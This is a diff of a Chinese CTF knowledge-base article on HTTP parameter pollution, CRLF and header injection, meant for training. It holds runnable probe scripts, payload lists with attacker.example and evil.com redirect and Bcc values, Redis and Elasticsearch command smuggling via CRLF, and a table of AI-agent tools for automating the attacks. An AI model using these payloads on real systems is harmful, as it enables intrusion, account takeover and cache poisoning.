@@ -3,206 +3,211 @@ id: "ctf-website/03-injection/hpp-crlf"
 title: "HPP / CRLF Injection / Header Injection"
 title_en: "HPP, CRLF Injection, and Header Injection"
 summary: >
-  介绍 HTTP 参数污染 (HPP)、CRLF 注入和 Header 注入三种攻击技术。HPP 利用不同框架对同参数取值的差异实现 WAF 绕过和逻辑篡改；CRLF 注入通过在 Header 中注入换行符实现 HTTP 响应拆分、SSRF 链和邮件头注入。
+  HPP/CRLF 的价值来自解析差异和头部边界差异：WAF、中间件、业务框架、代理、缓存、邮件网关可能读取不同的参数或 header。本篇给出 duplicate parameter 取值矩阵、JSON 重复键、分号/数组/编码差分、CRLF 响应头注入、Location/Set-Cookie/Cache/Email sink、可运行 oracle 和 Evidence 模板。
 summary_en: >
-  Three attack techniques: HTTP Parameter Pollution (HPP) exploiting framework differences in handling duplicate parameters for WAF bypass and logic manipulation; CRLF injection achieving HTTP response splitting, SSRF chaining, and email header injection via newline injection in headers.
+  HPP/CRLF value comes from parser and header-boundary differences across WAFs, middleware, frameworks, proxies, caches, and mail gateways. Includes duplicate parameter matrices, duplicate JSON keys, semicolon/array/encoding differentials, CRLF response header injection, Location/Set-Cookie/Cache/Email sinks, runnable oracles, and evidence templates.
 board: "ctf-website"
 category: "03-injection"
-signals: ["HPP", "参数污染", "CRLF", "换行注入", "响应拆分", "WAF bypass", "Header注入", "email注入"]
+signals: ["HPP", "参数污染", "CRLF", "换行注入", "响应拆分", "WAF bypass", "Header注入", "email注入", "duplicate parameter"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["HPP", "参数污染", "CRLF注入", "HTTP响应拆分", "换行注入", "WAF绕过", "header injection"]
-difficulty: "intermediate"
-tags: ["injection", "hpp", "crlf", "waf-bypass", "web-security", "ctf"]
+keywords: ["HPP", "参数污染", "CRLF注入", "HTTP响应拆分", "换行注入", "WAF绕过", "header injection", "duplicate key"]
+difficulty: "advanced"
+tags: ["injection", "hpp", "crlf", "parser-differential", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/08-infra/race-cache-smuggling", "ctf-website/20-oauth-deep/01-oauth-attack-chains"]
 ---
 
 # HPP / CRLF Injection / Header Injection
 
-## 1. HTTP Parameter Pollution (HPP)
+HPP 是参数取值差异，CRLF 是头部边界差异。二者的共同点是：前置层、中间件、业务代码和下游服务看到的“同一个输入”不一定相同。
 
-### 原理
+## 输入信号
 
-同参数多次出现时，不同框架取到的值不同：
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 同参数重复时响应变化 | first/last/array/join 取值矩阵 | `role=user&role=admin` 命中不同分支 | 框架固定取值且业务不受影响 |
+| WAF/业务错误不一致 | benign first + payload second | WAF 放行，业务进入 payload 分支 | 两层都看同一值 |
+| redirect/header 可控 | 注入 `%0d%0aX-Test:` | 响应头出现新增 header | header 编码或丢弃换行 |
+| URL 被后端请求 | CRLF 改 Host/header/path | SSRF 下游请求差异 | URL parser 拒绝控制字符 |
+| 邮件/邀请/反馈表单 | Subject/Bcc/Content-Type 头差分 | 邮件头/正文结构改变 | mailer 做 header encoding |
+| JSON body 允许重复键 | `{"a":1,"a":2}` | WAF/业务取不同值 | JSON parser 同层处理 |
 
+## 工作流
+
+```text
+建立 baseline 参数和 header
+  → 构造 duplicate/query/json/form 取值矩阵
+  → 对比 WAF/业务/下游响应差异
+  → 对 Location/Set-Cookie/Cache/Email/SSRF sink 测 CRLF
+  → 用响应头、回连、邮件、缓存或状态变化证明命中
 ```
-?role=user&role=admin
-```
 
-| 框架 | 取值 |
-|------|------|
-| PHP/Apache | `admin` (最后一个) |
-| JSP/Tomcat | `user` (第一个) |
-| ASP.NET/IIS | `user,admin` (数组) |
-| Flask (werkzeug) | `user` (第一个) |
-| Express (qs) | `['user','admin']` (数组) |
-| Go (net/http) | `user` (第一个) |
+## 0. HPP 取值矩阵
 
-### 利用矩阵
+| 平台/解析器 | 常见行为 | 利用方向 |
+|---|---|---|
+| PHP | 最后一个 | WAF 看 first，业务用 last |
+| Java Servlet | `getParameter` first，`getParameterValues` all | 中间件/业务分叉 |
+| ASP.NET | 逗号 join | 拼接后绕过枚举 |
+| Express `qs` | array/object | 类型混淆、PP 串联 |
+| Flask/Werkzeug | first，`getlist` all | 业务取值点差异 |
+| Go `net/http` | first，Values 保留 all | handler 自定义分叉 |
+
+## 1. HPP oracle
 
 ```python
-# hpp_attack.py — 覆盖所有 HPP 利用场景
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import requests
+from urllib.parse import urlencode
+
+def digest(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def cases(param, a, b):
+    return [
+        ("first_second", [(param, a), (param, b)]),
+        ("second_first", [(param, b), (param, a)]),
+        ("array_suffix", [(param, a), (param + "[]", b)]),
+        ("encoded_amp", [(param, a + "%26" + param + "=" + b)]),
+        ("semicolon", f"{param}={a};{param}={b}"),
+        ("comma_join", [(param, f"{a},{b}")]),
+    ]
+
+def hit(url, params):
+    if isinstance(params, str):
+        sep = "&" if "?" in url else "?"
+        r = requests.get(url + sep + params, timeout=10)
+    else:
+        r = requests.get(url, params=params, timeout=10)
+    return {"url": r.url, "status": r.status_code, "hash": digest(r.text), "location": r.headers.get("Location",""), "sample": r.text[:180]}
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--normal", default="user")
+    ap.add_argument("--payload", default="admin")
+    args = ap.parse_args()
+    for name, params in cases(args.param, args.normal, args.payload):
+        print(json.dumps({"case": name, "result": hit(args.url, params)}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：同一语义参数的顺序/数组/编码导致身份、价格、redirect、SQL/SSTI 过滤结果或响应 hash 稳定变化。失败样本：所有变体同一 hash，说明当前参数未被多层差异处理。
+
+## 2. JSON duplicate key
+
+```python
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
 import requests
 
-def hpp_fuzz(target_url: str, param: str, normal: str, malicious: str):
-    """
-    场景 A: WAF 绕过
-    WAF 检查第一个 role=user → 放行
-    后端 PHP 取最后一个 role=admin → 越权
-    """
-    r = requests.get(target_url, params=[
-        (param, normal),
-        (param, malicious),  # 同参数第二次
-    ])
-    return r
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
 
-# 场景 B: 密码重置 — 污染 email 参数
-# POST /reset with email=victim@x.com&email=attacker@x.com
-# WAF 查第一个 → 合法；后端用最后一个 → attacker 收邮件
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--cookie", default="")
+    args = ap.parse_args()
+    bodies = {
+        "role_user_admin": '{"role":"user","role":"admin"}',
+        "price_high_low": '{"price":1000,"price":1}',
+        "redirect_safe_evil": '{"redirect_uri":"https://safe.example","redirect_uri":"https://attacker.example"}',
+    }
+    headers = {"Content-Type": "application/json"}
+    if args.cookie:
+        headers["Cookie"] = args.cookie
+    for name, body in bodies.items():
+        r = requests.post(args.url, data=body, headers=headers, timeout=10)
+        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))
 
-# 场景 C: OAuth redirect_uri 污染
-# redirect_uri=https://legit.com&redirect_uri=https://evil.com
-# 中间件取第一个，OAuth 库取第二个
-
-# 场景 D: SQLi WAF 绕过
-# ?id=1&id=1' OR '1'='1
-# WAF 看到 id=1 → 安全
-# 后端 concat 或取最后一个 → 注入
-
-# 场景 E: 污染 JSON body 多个相同 key
-# {"role":"user","role":"admin"}
-# Python json.loads → admin (覆盖)
+if __name__ == "__main__":
+    main()
 ```
 
-### 自动探测器
+## 3. CRLF sink 矩阵
+
+| Sink | Payload | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Location` | `%0d%0aSet-Cookie: crlf=1` | 响应头新增 cookie/header | header value 被 encode |
+| `Set-Cookie` | `%0d%0aX-Injected: 1` | 新 header 出现 | cookie parser 拒绝 |
+| cache key/header | `%0d%0aCache-Control: public` | 缓存状态改变 | CDN 丢弃换行 |
+| SSRF URL | `%0d%0aHost: internal` | 下游 listener 看到 header | URL parser reject |
+| email subject/name | `x%0d%0aBcc: ...` | 邮件头结构变化 | mailer 编码头部 |
 
 ```python
-# 批量探测不同框架的 HPP 行为
-HPP_PROBES = [
-    # 单参数多次
-    "?id=1&id=2",
-    "?user=guest&user=admin",
-    # URL 编码变体
-    "?user=guest%26user=admin",
-    "?user=guest&user[]=admin",
-    # 分号分隔
-    "?user=guest;user=admin",
-    # U+0026 全角
-    "?user=guest＆user=admin",
-]
-```
+#!/usr/bin/env python3
+import argparse
+import json
+import requests
 
----
-
-## 2. CRLF Injection
-
-```python
-# ===== HTTP Response Splitting (CRLF in header value) =====
-# 在 Location / Set-Cookie 等 header 中注入 \r\n
-
-CRLF_PAYLOADS = [
-    # 基础
-    "\r\nSet-Cookie: injected=true",
-    "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n<script>alert(1)</script>",
-    # 编码
-    "%0d%0aSet-Cookie:%20injected=true",
-    "%0D%0ASet-Cookie:%20injected=true",
-    "\\r\\nSet-Cookie: injected=true",
-    # 绕过 WAF 只过滤 \r\n 但忽略单独的 \r 或 \n
-    "\nSet-Cookie: injected=true",
-    "\rSet-Cookie: injected=true",
-    # Unicode
-    "
-Set-Cookie: injected=true",
-]
-```
-
-### CRLF→SSRF 链
-
-```python
-# 如果可控 header 值 (如 X-Forwarded-For) 被拼接到后端 HTTP 请求:
-# GET /api?url=http://127.0.0.1:%0d%0aHost:%20evil.com%0d%0a
-# → SSRF + Host 注入
-
-# CRLF→Cache Poisoning 链
-# X-Forwarded-Host: evil.com%0d%0aX-Cache: miss
-# → CDN 可能缓存注入的内容
-```
-
-### Email 注入 (SMTP CRLF)
-
-```python
-# 如果目标有"联系我们"/"反馈"/"邀请" 表单
-# 后端用 mail() 发送但没有净化
-
-# CRLF 注入 → 劫持邮件头
 PAYLOADS = [
-    # BCC 注入 — 密送给自己
-    "test\r\nBcc: attacker@evil.com",
-    # 修改 Subject
-    "test\r\nSubject: <script>alert(1)</script>",
-    # 完全劫持邮件正文 (后面的内容变正文)
-    "test\r\n\r\nAttacker controlled body",
-    # 多收件人
-    "test\r\nTo: admin@target.com,\r\nTo: attacker@evil.com",
-    # Content-Type 改变 (HTML注入)
-    "test\r\nContent-Type: text/html\r\n\r\n<h1>Phish</h1>",
+    "%0d%0aX-Injected: crlf_probe",
+    "%0D%0ASet-Cookie:%20crlf_probe=1",
+    "%0aX-Injected:%20lf_probe",
+    "%0dX-Injected:%20cr_probe",
+    "%250d%250aX-Injected:%2520double_encoded",
 ]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True, help="Use {payload} placeholder")
+    args = ap.parse_args()
+    for p in PAYLOADS:
+        url = args.url.replace("{payload}", p)
+        r = requests.get(url, allow_redirects=False, timeout=10)
+        interesting = {k: v for k, v in r.headers.items() if "Injected" in k or "Set-Cookie" in k or "Location" in k}
+        print(json.dumps({"payload": p, "status": r.status_code, "headers": interesting, "body": r.text[:120]}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-将上面的 payload 放入当前 case 的最小复现脚本；不要把目标域名、Cookie、邮箱或
-请求抓包提交到公共仓库。
+## 4. 组合攻击链
 
----
+```text
+HPP redirect_uri
+  → OAuth 中间件取 first，业务取 last
+  → code/token 回到 attacker callback
 
-## 3. Header Injection via URL
+HPP amount/role
+  → WAF/校验层看 normal
+  → 业务层取 payload
+  → 订单、权限、flag 差异
 
-```python
-# 如果后端把用户 URL 作为 HTTP 请求的目标
-# 在 URL 中注入 \r\n 拆分请求:
+CRLF Location
+  → 响应头注入 Set-Cookie/Cache-Control
+  → session fixation / cache poisoning / XSS 二跳
 
-# Redis via CRLF in URL
-"http://127.0.0.1:6379/%0d%0aSET%20key%20value%0d%0a"
-
-# Elasticsearch via CRLF
-"http://127.0.0.1:9200/%0d%0aGET%20/_search%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a"
+CRLF SSRF URL
+  → 下游 Host/header/path 差异
+  → 内网服务探测或协议拼接
 ```
-
----
-
-## 4. 攻击链
-
-```
-CRLF in URL param → SSRF → Redis/Gopher → RCE
-CRLF in redirect → Response Splitting → XSS
-CRLF in email → BCC injection → 邮件窃取 → Token 重置劫持
-HPP bypass WAF → SQLi/SSTI → RCE
-HPP OAuth redirect_uri → 授权码窃取 → Account Takeover
-```
-
-## 工具引用
-
-```bash
-# 通用 HTTP 探测框架；目标参数由当前 case 提供
-python scripts/ctf-website/http_probe.py https://example.test/
-
-# 安装缺失工具
-powershell scripts/ctf-website/install_missing_tools.ps1
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| HTTP 参数污染探测 | `http_probe` | 发送 HPP/CRLF payload |
-| 按信号查技术 | `kb_router` | 搜索 hpp/crlf 相关技术文件 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| 参数矩阵 | 参数名、顺序、编码、数组/分号/JSON 重复键 |
+| 解析差异 | WAF/中间件/业务/下游响应状态、hash、错误文本 |
+| Header sink | 可控 header、payload 编码层数、新增响应头 |
+| 成功样本 | redirect、cookie、cache、订单、权限、OAuth code、flag 差异 |
+| 失败样本 | 所有变体同 hash、换行被编码、pre-parser 拒绝控制字符 |
+| 下一跳 | redirect 转 OAuth；cache 转 08-infra；SSRF 转 04-ssrf；金额转 payment |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 参数矩阵 | `http_probe` | 发送 duplicate/query/json/form 变体 |
+| Header sink | `http_probe` | 固定 redirect/header 参数并比较响应头 |
+| 知识路由 | `kb_router` | 按 HPP、CRLF、header injection、parser differential 搜索 |
